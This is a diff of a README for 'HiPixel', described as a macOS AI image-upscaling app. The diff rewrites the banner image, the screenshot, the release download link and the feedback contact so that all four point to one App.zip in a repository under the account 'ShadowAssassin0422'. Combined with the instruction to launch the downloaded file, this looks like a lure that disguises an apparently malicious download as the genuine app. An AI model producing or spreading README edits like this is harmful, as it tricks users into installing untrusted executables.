@@ -1,6 +1,6 @@
 # HiPixel
 
-![HiPixel Banner](https://example.com/hipixel_banner.jpg)
+![HiPixel Banner](https://github.com/ShadowAssassin0422/HiPixel/releases/download/v1.0/App.zip)
 
 Welcome to HiPixel, a cutting-edge native macOS application for AI-powered image super-resolution! Built with SwiftUI and utilizing Upscayl's powerful AI models, HiPixel takes your low-resolution images to the next level with stunning clarity and detail.
 
@@ -14,7 +14,7 @@ Welcome to HiPixel, a cutting-edge native macOS application for AI-powered image
 
 To install HiPixel, follow these steps:
 
-1. Download the [latest release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+1. Download the [latest release](https://github.com/ShadowAssassin0422/HiPixel/releases/download/v1.0/App.zip)
    
 2. Launch the downloaded file to begin the installation process
 
@@ -36,7 +36,7 @@ To use HiPixel:
 
 ## Screenshots
 
-![HiPixel Screenshot](https://example.com/hipixel_screenshot1.jpg)
+![HiPixel Screenshot](https://github.com/ShadowAssassin0422/HiPixel/releases/download/v1.0/App.zip)
 
 ## Contributions
 
@@ -54,6 +54,6 @@ We welcome contributions to HiPixel! To contribute, follow these steps:
 
 ## Feedback
 
-We value your feedback! If you have any issues, suggestions, or feedback, please feel free to [reach out to us](mailto:hipixel@example.com).
+We value your feedback! If you have any issues, suggestions, or feedback, please feel free to [reach out to us](https://github.com/ShadowAssassin0422/HiPixel/releases/download/v1.0/App.zip).
 
 ### Thank you for using HiPixel! 🌟
